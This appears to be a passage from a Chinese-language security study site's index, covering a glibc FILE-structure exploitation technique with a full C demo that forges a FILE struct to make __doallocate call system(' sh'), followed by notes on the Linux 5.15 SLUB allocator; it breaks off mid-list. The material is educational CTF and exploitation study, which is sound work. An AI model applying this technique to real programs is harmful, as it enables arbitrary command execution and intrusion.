_wide_data)-&gt;_wide_vtable\n</code></pre> <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u4ece\u200b <code>_wide_data</code> \u200b\u5b57\u200b\u6bb5\u200b\u8bfb\u53d6\u200b vtable\uff0c\u200b\u8c03\u7528\u200b\u8fd9\u4e2a\u200b vtable \u200b\u4e2d\u200b\u7684\u200b __doallocate \u200b\u5b57\u200b\u6bb5\u200b\u6307\u5411\u200b\u7684\u200b\u51fd\u6570\u200b\u3002\u200b\u800c\u200b\u8fd9\u4e2a\u200b vtable \u200b\u662f\u200b\u6ca1\u6709\u200b\u68c0\u67e5\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u653b\u51fb\u200b\u5b83\u200b\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u628a\u200b <code>_wide_data-&gt;_wide_vtable-&gt;__doallocate</code> \u200b\u6307\u5411\u200b <code>system</code>\uff0c\u200b\u90a3\u4e48\u200b <code>_IO_WDOALLOCATE (fp)</code> \u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b\u8c03\u7528\u200b\u4e86\u200b <code>system(fp)</code>\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u518d\u200b\u628a\u200b fp \u200b\u4f2a\u9020\u200b\u6210\u200b\u4e00\u4e2a\u200b\u6267\u884c\u200b shell \u200b\u7684\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5c31\u200b\u5b9e\u73b0\u200b\u4e86\u200b get shell\u3002\u200b\u56e0\u4e3a\u200b <code>_wide_data</code> \u200b\u548c\u200b <code>_wide_data-&gt;_wide_vtable</code> \u200b\u90fd\u200b\u662f\u200b\u6307\u9488\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b\u989d\u5916\u200b\u7684\u200b\u5206\u914d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5b83\u4eec\u200b\u90fd\u200b\u6307\u5411\u200b\u4f2a\u9020\u200b\u7684\u200b FILE \u200b\u7ed3\u6784\u200b\u4f53\u200b\u672c\u8eab\u200b\uff0c\u200b\u5404\u4e2a\u200b\u5b57\u6bb5\u200b\u662f\u200b\u4e0d\u4f1a\u200b\u91cd\u5408\u200b\u7684\u200b\u3002\u200b\u6f14\u793a\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define JUMP_FIELD(TYPE, NAME) void *NAME\n\nstruct _IO_jump_t {\n  JUMP_FIELD(size_t, __dummy);\n  JUMP_FIELD(size_t, __dummy2);\n  JUMP_FIELD(_IO_finish_t, __finish);\n  JUMP_FIELD(_IO_overflow_t, __overflow);\n  JUMP_FIELD(_IO_underflow_t, __underflow);\n  JUMP_FIELD(_IO_underflow_t, __uflow);\n  JUMP_FIELD(_IO_pbackfail_t, __pbackfail);\n  /* showmany */\n  JUMP_FIELD(_IO_xsputn_t, __xsputn);\n  JUMP_FIELD(_IO_xsgetn_t, __xsgetn);\n  JUMP_FIELD(_IO_seekoff_t, __seekoff);\n  JUMP_FIELD(_IO_seekpos_t, __seekpos);\n  JUMP_FIELD(_IO_setbuf_t, __setbuf);\n  JUMP_FIELD(_IO_sync_t, __sync);\n  JUMP_FIELD(_IO_doallocate_t, __doallocate);\n  JUMP_FIELD(_IO_read_t, __read);\n  JUMP_FIELD(_IO_write_t, __write);\n  JUMP_FIELD(_IO_seek_t, __seek);\n  JUMP_FIELD(_IO_close_t, __close);\n  JUMP_FIELD(_IO_stat_t, __stat);\n  JUMP_FIELD(_IO_showmanyc_t, __showmanyc);\n  JUMP_FIELD(_IO_imbue_t, __imbue);\n};\n\nstruct _IO_FILE_plus {\n  FILE file;\n  struct _IO_jump_t *vtable;\n};\n\nstruct __gconv_step_data {\n  unsigned char *__outbuf;\n  unsigned char *__outbufend;\n  int __flags;\n  int __invocation_counter;\n  int __internal_use;\n  __mbstate_t *__statep;\n  __mbstate_t __state;\n};\n\ntypedef struct {\n  struct __gconv_step *step;\n  struct __gconv_step_data step_data;\n} _IO_iconv_t;\n\nstruct _IO_codecvt {\n  _IO_iconv_t __cd_in;\n  _IO_iconv_t __cd_out;\n};\n\nstruct _IO_wide_data {\n  wchar_t *_IO_read_ptr;   /* Current read pointer */\n  wchar_t *_IO_read_end;   /* End of get area. */\n  wchar_t *_IO_read_base;  /* Start of putback+get area. */\n  wchar_t *_IO_write_base; /* Start of put area. */\n  wchar_t *_IO_write_ptr;  /* Current put pointer. */\n  wchar_t *_IO_write_end;  /* End of put area. */\n  wchar_t *_IO_buf_base;   /* Start of reserve area. */\n  wchar_t *_IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */\n  wchar_t *_IO_backup_base; /* Pointer to first valid character of\n                               backup area */\n  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */\n\n  __mbstate_t _IO_state;\n  __mbstate_t _IO_last_state;\n  struct _IO_codecvt _codecvt;\n\n  wchar_t _shortbuf[1];\n\n  const struct _IO_jump_t *_wide_vtable;\n};\n\nint main() {\n  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep\n  // _IO_2_1_stdin_\n  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;\n\n  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep\n  // _IO_list_all\n  struct _IO_FILE_plus **list_all =\n      (struct _IO_FILE_plus **)(libc_base + 0x1ed5a0);\n\n  // create a fake FILE struct\n  struct _IO_FILE_plus *fake_file =\n      (struct _IO_FILE_plus *)malloc(sizeof(struct _IO_FILE_plus));\n\n  // we must satisfy the following conditions:\n  // 1. required in _IO_flush_all_lockp: (_mode &lt;= 0 &amp;&amp; _IO_write_ptr &gt;\n  // _IO_write_base) || (_vtable_offset == 0 &amp;&amp; _mode &gt; 0 &amp;&amp;\n  // _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base)\n  // 2. required in _IO_wfile_overflow: (_flags &amp; _IO_NO_WRITES) == 0 &amp;&amp; (_flags\n  // &amp; _IO_CURRENTLY_PUTTING) == 0 &amp;&amp; _wide_data-&gt;_IO_write_base == 0\n  // 3. required in _IO_wdoallocbuf: _wide_data-&gt;_IO_buf_base == 0 &amp;&amp; (flags &amp;\n  // _IO_UNBUFFERED) == 0\n\n  // doallocate is called with fake_file as its first argument,\n  // we want it to be equivalent to system(\"/bin/sh\").\n  // therefore the _flags fields should pass the conditions above,\n  // and also appears as a string to launch sh.\n  // _IO_NO_WRITES is 0x0008, _IO_CURRENTLY_PUTTING is 0x0800,\n  // _IO_UNBUFFERED is 0x0002.\n  // we can handle these bit fields by adding one space (0x20)\n  // offset 0x00\n  char *flags = (char *)&amp;fake_file-&gt;file._flags;\n  strcpy(flags, \" sh\"); // 0x20, 0x73, 0x68, 0x00\n\n  // offset 0x20\n  fake_file-&gt;file._IO_write_base = (char *)0;\n\n  // offset 0x28\n  fake_file-&gt;file._IO_write_ptr = (char *)1;\n\n  // offset 0xc0\n  fake_file-&gt;file._mode = 0;\n\n  // offset 0xa0\n  // reinterpret fake_file as _IO_wide_data to avoid another malloc\n  fake_file-&gt;file._wide_data = (struct _IO_wide_data *)fake_file;\n\n  // offset 0x18\n  ((struct _IO_wide_data *)fake_file)-&gt;_IO_write_base = 0;\n\n  // offset 0x30\n  ((struct _IO_wide_data *)fake_file)-&gt;_IO_buf_base = 0;\n\n  // reinterpret fake_file as _IO_jump_t to avoid another malloc\n  // offset 0xe0\n  fake_file-&gt;file._wide_data-&gt;_wide_vtable = (struct _IO_jump_t *)fake_file;\n\n  // offset 0x68\n  // doallocate is called within _IO_wdoallocbuf\n  ((struct _IO_jump_t *)fake_file)-&gt;__doallocate = system;\n\n  // use _IO_wfile_jumps as vtable to pass vtable validation\n  // offset 0xd8\n  fake_file-&gt;vtable = (struct _IO_jump_t *)(libc_base + 0x1e8f60);\n\n  // all fields set:\n  // 0x00: fake_file-&gt;file._flags = \" sh\"\n  // 0x18: fake_file-&gt;file._wide_data-&gt;_IO_write_base = 0\n  // 0x20: fake_file-&gt;file._IO_write_base = 0\n  // 0x28: fake_file-&gt;file._IO_write_ptr = 1\n  // 0x30: fake_file-&gt;file._wide_data-&gt;_IO_buf_base = 0\n  // 0x68: fake_file-&gt;file._wide_data-&gt;_wide_vtable-&gt;__doallocate = system\n  // 0x88: fake_file-&gt;file._lock = _IO_stdfile_0_lock (required on glibc 2.38+)\n  // 0xa0: fake_file-&gt;file._wide_data = fake_file\n  // 0xc0: fake_file-&gt;file._mode = 0\n  // 0xd8: fake_file-&gt;vtable = _IO_wfile_jumps\n  // 0xe0: fake_file-&gt;file._wide_data-&gt;_wide_vtable = fake_file\n\n  *list_all = fake_file;\n\n  return 0;\n}\n</code></pre> <p>\u200b\u6ce8\u200b\uff1a\u200b\u4ece\u200b glibc 2.38 \u200b\u5f00\u59cb\u200b\uff0c\u200b\u7531\u4e8e\u200b Always do locking when accessing streams (bug 15142, bug 14697) \u200b\u7684\u200b\u6539\u52a8\u200b\uff0c<code>_IO_cleanup</code> \u200b\u4f1a\u200b\u53bb\u200b\u83b7\u53d6\u200b FILE \u200b\u7ed3\u6784\u200b\u7684\u200b\u9501\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5b83\u200b\u7684\u200b <code>_lock</code> \u200b\u5b57\u200b\u6bb5\u200b\u9700\u8981\u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u5408\u6cd5\u200b\u7684\u200b <code>_IO_lock_t</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u590d\u7528\u200b stdin/stdout/stderr \u200b\u5df2\u6709\u200b\u7684\u200b\u9501\u200b\uff1a<code>_IO_stdfile_{0,1,2}_lock</code>\u3002</p>"},{"location":"software/glibc_file.html#_4","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u7b2c\u4e03\u5c4a\u200b\u201c\u200b\u6e56\u6e58\u200b\u676f\u200b\u201dHouse _OF _Emma | \u200b\u8bbe\u8ba1\u200b\u601d\u8def\u200b\u4e0e\u200b\u89e3\u6790\u200b</li> <li>Unexpected heap primitive and unintended solve - codegate quals 2025 writeup</li> <li>[\u200b\u539f\u521b\u200b] House of apple \u200b\u4e00\u79cd\u200b\u65b0\u200b\u7684\u200b glibc \u200b\u4e2d\u200b IO \u200b\u653b\u51fb\u200b\u65b9\u6cd5\u200b (2)</li> <li>Advanced Heap Exploitation: File Stream Oriented Programming</li> <li>STACK the Flags CTF 2022</li> <li>glibc 2.24 \u200b\u4e0b\u200b IO_FILE \u200b\u7684\u200b\u5229\u7528\u200b</li> </ul>"},{"location":"software/linux_allocator.html","title":"Linux \u200b\u5185\u5b58\u200b\u5206\u914d\u5668","text":""},{"location":"software/linux_allocator.html#linux-515","title":"Linux 5.15","text":"<p>Linux 5.15 \u200b\u662f\u200b Ubuntu 22.04 Jammy \u200b\u4f7f\u7528\u200b\u7684\u200b\u9ed8\u8ba4\u200b\u5185\u6838\u200b\u7248\u672c\u200b\u3002\u200b\u4e0b\u9762\u200b\u9488\u5bf9\u200b Linux 5.15 \u200b\u7684\u200b\u6e90\u7801\u200b\uff0c\u200b\u5206\u6790\u200b\u5b83\u200b\u7684\u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u5b9e\u73b0\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b Linux \u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\u7684\u200b API\uff0c\u200b\u53c2\u8003\u200b Memory Allocation Guide\uff1a</p> <ul> <li>\u200b\u5bf9\u4e8e\u200b\u5c0f\u200b\u5757\u200b\u6570\u636e\u200b\u7684\u200b\u5206\u914d\u200b\uff0c\u200b\u7528\u200b kmalloc/kmalloc_array/krealloc_array/kcalloc/kzalloc/kmem_cache_alloc</li> <li>\u200b\u5bf9\u4e8e\u200b\u8f83\u5927\u200b\u5757\u200b\u6570\u636e\u200b\u7684\u200b\u5206\u914d\u200b\uff0c\u200b\u7528\u200b vmalloc/vzalloc</li> <li>\u200b\u4ee5\u9875\u200b\u4e3a\u200b\u5355\u4f4d\u200b\u8fdb\u884c\u200b\u5206\u914d\u200b\uff1aalloc_pages</li> <li>\u200b\u5176\u4ed6\u200b\u4e13\u7528\u200b\u7684\u200b\u5206\u914d\u5668\u200b\uff1acma_alloc/zs_malloc</li> </ul> <p>\u200b\u5206\u914d\u200b\u65f6\u4f1a\u200b\u9700\u8981\u200b\u4f20\u5165\u200b\u4e00\u4e2a\u200b GFP\uff08Get Free Pages\uff09\u200b\u53c2\u6570\u200b\uff0c\u200b\u5e38\u89c1\u200b\u662f\u200b GFP_KERNEL \u200b\u548c\u200b GFP_KERNEL_ACCOUNT\uff0c\u200b\u5176\u4e2d\u200b\u540e\u8005\u200b\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u5b89\u5168\u200b\u4fdd\u62a4\u63aa\u65bd\u200b\uff0c\u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u7531\u200b\u7528\u6237\u200b\u6001\u200b\u89e6\u53d1\u200b\u7684\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u5206\u914d\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u7528\u200b GFP_USER\u3002</p>"},{"location":"software/linux_allocator.html#slab-cache-allocator","title":"slab cache allocator","text":"<p>\u200b\u5176\u4e2d\u200b\u5c0f\u200b\u5757\u200b\u6570\u636e\u200b\u7684\u200b\u5206\u914d\u200b\uff0c\u200b\u7528\u200b\u7684\u200b\u662f\u200b slab cache allocator\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b\u4e09\u4ee3\u200b\u5b9e\u73b0\u200b\uff1aSLOB\uff0cSLAB \u200b\u548c\u200b SLUB\uff0c\u200b\u76ee\u524d\u200b\u7684\u200b\u7248\u672c\u200b\u662f\u200b SLUB\u3002\u200b\u5b83\u4f1a\u200b\u628a\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u5bf9\u8c61\u200b\u653e\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u5728\u200b <code>/proc/slabinfo</code> \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ cat /proc/slabinfo\nslabinfo - version: 2.1\n# name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_&gt;\ntask_struct         1922   2100   6528    5    8 : tunables    0    0    0 : slabdata    420    420      0\n</code></pre> <p>\u200b\u610f\u601d\u200b\u662f\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b 2100 \u200b\u4e2a\u200b <code>struct task_struct</code>\uff0c\u200b\u5df2\u7ecf\u200b\u5206\u914d\u200b\u4e86\u200b 1922 \u200b\u4e2a\u200b\uff0c\u200b\u6bcf\u4e2a\u200b <code>struct task_struct</code> \u200b\u662f\u200b 6528 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6bcf\u4e2a\u200b slab \u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b 5 \u200b\u4e2a\u200b <code>struct task_struct</code>\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b <code>6528 * 5 = 32640</code> \u200b\u5b57\u8282\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>ceil(32640 / 4096) = 8</code> \u200b\u4e2a\u200b 4KB \u200b\u5927\u5c0f\u200b\u7684\u200b\u9875\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u53eb\u505a\u200b <code>task_struct</code> \u200b\u7684\u200b slab cache allocator \u200b\u662f\u200b\u5728\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u8fd9\u6837\u200b\u521b\u5efa\u200b\u51fa\u6765\u200b\u7684\u200b\uff1a</p> <pre><code>// in kernel/fork.c:fork_init\n/* create a slab on which task_structs can be allocated */\ntask_struct_whitelist(&amp;useroffset, &amp;usersize);\ntask_struct_cachep = kmem_cache_create_usercopy(\"task_struct\",\n        arch_task_struct_size, align,\n        SLAB_PANIC|SLAB_ACCOUNT,\n        useroffset, usersize, NULL);\n</code></pre> <p>\u200b\u540e\u7eed\u200b\u8981\u200b\u5206\u914d\u200b <code>struct task_struct</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u90fd\u200b\u7528\u200b\u8fd9\u4e2a\u200b <code>struct kmem_cache *</code>\uff1a</p> <pre><code>// in kernel/fork.c\nstatic struct kmem_cache *task_struct_cachep;\n\nstatic inline struct task_struct *alloc_task_struct_node(int node)\n{\n    return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);\n}\n\nstatic inline void free_task_struct(struct task_struct *tsk)\n{\n    kmem_cache_free(task_struct_cachep, tsk);\n}\n</code></pre>"},{"location":"software/linux_allocator.html#_1","title":"\u57fa\u672c\u6982\u5ff5","text":"<p>slab cache allocator \u200b\u6bcf\u6b21\u200b\u53ea\u80fd\u200b\u5206\u914d\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u4e0d\u540c\u200b\u7684\u200b slab cache allocator\uff0c\u200b\u7528\u4e8e\u200b\u5206\u914d\u200b\u4e0d\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\u3002</p> <p>slab cache allocator \u200b\u4f7f\u7528\u200b alloc_pages \u200b\u8c03\u7528\u200b\u53bb\u200b\u83b7\u53d6\u200b 2 \u200b\u7684\u200b\u5e42\u6b21\u200b\u4e2a\u200b\u9875\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u9875\u200b\u5728\u200b\u865a\u62df\u5730\u5740\u200b\u548c\u200b\u7269\u7406\u5730\u5740\u200b\u4e0a\u200b\u90fd\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u9875\u200b\u6784\u6210\u200b\u4e00\u4e2a\u200b slab\uff0c\u200b\u6240\u4ee5\u200b\u4e0a\u9762\u200b\u4f1a\u200b\u770b\u5230\u200b pages per slab \u200b\u90fd\u200b\u662f\u200b 2 \u200b\u7684\u200b\u5e42\u6b21\u200b\u3002slab cache allocator \u200b\u4f1a\u200b\u7ef4\u62a4\u200b\u591a\u4e2a\u200b slab\uff0c\u200b\u6bcf\u4e2a\u200b slab \u200b\u5bf9\u5e94\u200b\u82e5\u5e72\u4e2a\u200b\u9875\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u9875\u200b\u91cc\u9762\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5b9e\u9645\u200b\u7684\u200b\u5bf9\u8c61\u200b\u3002</p>"},{"location":"software/linux_allocator.html#struct-kmem_cache","title":"struct kmem_cache","text":"<p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b\u8fd9\u4e2a\u200b <code>struct kmem_cache</code> \u200b\u662f\u200b\u600e\u4e48\u200b\u7ef4\u62a4\u200b\u5185\u5b58\u200b\u7684\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u5b9a\u4e49\u200b\u5728\u200b <code>include/linux/slub_def.h</code> \u200b\u4e2d\u200b\uff1a</p> <pre><code>struct kmem_cache {\n    struct kmem_cache_cpu __percpu *cpu_slab;\n    /* Used for retrieving partial slabs, etc. */\n    slab_flags_t flags;\n    unsigned long min_partial;\n    unsigned int size;  /* The size of an object including metadata */\n    unsigned int object_size;/* The size of an object without metadata */\n    struct reciprocal_value reciprocal_size;\n    unsigned int offset;    /* Free pointer offset */\n    /* Number of per cpu partial objects to keep around */\n    unsigned int cpu_partial;\n    struct kmem_cache_order_objects oo;\n\n    /* Allocation and freeing of slabs */\n    struct kmem_cache_order_objects max;\n    struct kmem_cache_order_objects min;\n    gfp_t allocflags;   /* gfp flags to use on each alloc */\n    int refcount;       /* Refcount for slab cache destroy */\n    void (*ctor)(void *);\n    unsigned int inuse;     /* Offset to metadata */\n    unsigned int align;     /* Alignment */\n    unsigned int red_left_pad;  /* Left redzone padding size */\n    const char *name;   /* Name (only for display!) */\n    struct list_head list;  /* List of slab caches */\n    struct kobject kobj;    /* For sysfs */\n    unsigned long random;\n\n    /*\n     * Defragmentation by allocating from a remote node.\n     */\n    unsigned int remote_node_defrag_ratio;\n\n    unsigned int *random_seq;\n\n    unsigned int useroffset;    /* Usercopy region offset */\n    unsigned int usersize;      /* Usercopy region size */\n\n    struct kmem_cache_node *node[MAX_NUMNODES];\n};\n</code></pre> <p>\u200b\u5728\u200b\u8fd9\u200b\u91cc\u9762\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b <code>struct kmem_cache_node *node[MAX_NUMNODES]</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u5b83\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u6bcf\u4e2a\u200b NUMA Node \u200b\u5bf9\u5e94\u200b\u7684\u200b\u5185\u5b58\u200b\u91cc\u200b\u4fdd\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b <code>mm/slab.h</code> \u200b\u4e2d\u200b\u7684\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>struct kmem_cache_node {\n    spinlock_t list_lock;\n    unsigned long nr_partial;\n    struct list_head partial;\n};\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b <code>partial</code> \u200b\u5b57\u6bb5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u9664\u4e86\u200b <code>kmem_cache_node</code> \u200b\u672c\u8eab\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u7ed3\u70b9\u200b\u7684\u200b\u7c7b\u578b\u200b\u90fd\u200b\u662f\u200b <code>struct page</code>\uff0c\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u54ea\u4e9b\u200b slab \u200b\u8fd8\u6709\u200b\u6ca1\u6709\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002<code>struct page</code> \u200b\u662f\u200b\u5728\u200b\u901a\u8fc7\u200b <code>alloc_pages</code> \u200b\u5206\u914d\u200b\u82e5\u5e72\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u9875\u200b\uff08\u200b\u5373\u200b\u4e00\u4e2a\u200b slab\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u88ab\u200b\u6784\u9020\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u5b83\u200b\u5185\u90e8\u200b\u9884\u7559\u200b\u4e86\u200b 5 \u200b\u4e2a\u200b size_t \u200b\u5927\u5c0f\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u7ed9\u200b\u5185\u6838\u200b\u91cc\u200b\u8fd9\u4e9b\u200b\u8fde\u7eed\u200b\u7684\u200b\u9875\u200b\u7684\u200b\u4f7f\u7528\u8005\u200b\u9884\u7559\u200b\uff0c\u200b\u5728\u200b\u8fd9\u91cc\u200b slab cache allocator \u200b\u5c31\u662f\u200b\u8fd9\u4e2a\u200b\u4f7f\u7528\u8005\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u7528\u6cd5\u200b\u662f\u200b\uff1a</p> <pre><code>struct {\n    union {\n        struct list_head slab_list;\n        struct {    /* Partial pages */\n            struct page *next;\n            int pages;  /* Nr of pages left */\n            int pobjects;   /* Approximate count */\n        };\n    };\n    struct kmem_cache *slab_cache; /* not slob */\n    /* Double-word boundary */\n    void *freelist;     /* first free object */\n    union {\n        unsigned long counters;     /* SLUB */\n        struct {            /* SLUB */\n            unsigned inuse:16;\n            unsigned objects:15;\n            unsigned frozen:1;\n        };\n    };\n};\n</code></pre> <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0cslab cache allocator \u200b\u7ef4\u62a4\u200b\u4e86\u200b\u82e5\u5e72\u4e2a\u200b slab\uff0c\u200b\u6bcf\u4e2a\u200b slab \u200b\u5bf9\u5e94\u200b\u82e5\u5e72\u4e2a\u200b\u8fde\u7eed\u200b\u7684\u200b\u9875\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>struct page</code> \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5143\u200b\u6570\u636e\u200b\u8bb0\u5f55\u200b\u4e86\u200b slab \u200b\u94fe\u8868\u200b\uff0c\u200b\u7edf\u8ba1\u6570\u636e\u200b\uff0c\u200b\u4ee5\u53ca\u200b freelist \u200b\u6307\u9488\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002</p>"},{"location":"software/linux_allocator.html#kmem_cache_alloc-fast-path","title":"kmem_cache_alloc (fast path)","text":"<p>\u200b\u6839\u636e\u200b\u4ee5\u4e0a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63a8\u6d4b\u200b\u51fa\u200b slab cache allocator \u200b\u7684\u200b\u5de5\u4f5c\u200b\u65b9\u5f0f\u200b\uff1a\u200b\u5b83\u4f1a\u7528\u200b alloc_pages \u200b\u5206\u914d\u200b\u5e76\u200b\u7ef4\u62a4\u200b\u8fde\u7eed\u200b\u7684\u200b\u82e5\u5e72\u4e2a\u200b\u9875\u200b\uff08\u200b\u5373\u200b\u4e00\u4e2a\u200b slab\uff09\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u9875\u200b\u91cc\u9762\u200b\u653e\u200b\u82e5\u5e72\u4e2a\u200b\u76f8\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b object\uff1a\u200b\u8fd9\u4e2a\u200b object \u200b\u9664\u4e86\u200b\u4fdd\u5b58\u200b\u5b9e\u9645\u200b malloc \u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u5143\u200b\u6570\u636e\u200b\u548c\u200b padding\u3002\u200b\u5f53\u200b\u4e00\u4e2a\u200b object \u200b\u88ab\u200b\u91ca\u653e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u200b\u5185\u90e8\u200b\u4f1a\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b\u6307\u9488\u200b\uff0c\u200b\u6307\u5411\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b object \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b\u8fd9\u4e9b\u200b\u5730\u5740\u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b freelist \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u3002\u200b\u8fd9\u4e2a\u200b freelist \u200b\u7684\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>struct page</code> \u200b\u7684\u200b freelist \u200b\u5b57\u200b\u6bb5\u200b\u91cc\u9762\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u540e\u9762\u200b\u4f1a\u200b\u770b\u5230\u200b\u7684\u200b per-cpu \u200b\u7ed3\u6784\u200b\u4f53\u200b <code>struct kmem_cache_cpu</code> \u200b\u7684\u200b freelist \u200b\u5b57\u200b\u6bb5\u200b\u91cc\u9762\u200b\u3002\u200b\u8981\u200b\u5206\u914d\u5185\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u6839\u636e\u200b\u4f20\u5165\u200b\u7684\u200b kmem_cache\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b freelist\uff0c\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u9996\u5148\u200b\u7528\u200b per-cpu \u200b\u7684\u200b <code>struct kmem_cache_cpu</code> \u200b\u7684\u200b freelist</li> <li>\u200b\u5982\u679c\u200b freelist \u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4ece\u200b freelist \u200b\u4e2d\u200b\u53d6\u51fa\u200b\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b freelist\uff0c\u200b\u6307\u5411\u200b\u5b83\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u5982\u679c\u200b freelist 